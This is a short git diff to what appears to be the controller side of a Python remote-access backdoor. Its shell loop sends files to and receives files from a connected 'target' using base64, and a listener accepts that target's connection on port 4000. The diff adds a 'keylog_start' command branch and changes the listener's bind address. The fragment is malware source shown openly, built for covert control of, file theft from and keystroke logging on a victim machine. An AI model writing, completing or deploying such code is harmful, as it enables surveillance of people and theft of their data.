@@ -31,6 +31,8 @@ def shell():
 			with open(command[9:],"wb")as file:
 				result=reliable_recv()
 				file.write(base64.b64decode(result))
+		elif command[:12]=="keylog_start":
+			continue
 		elif command[:6]=="upload":
 			try:
 				with open(command[7:],"rb") as fin:
@@ -50,7 +52,7 @@ def server():
 	global target
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-	s.bind(("192.168.1.30",4000))
+	s.bind(("192.168.1.26",4000))
 	s.listen(5)
 	print("listening for incoming connection")
 	target, ip=s.accept()
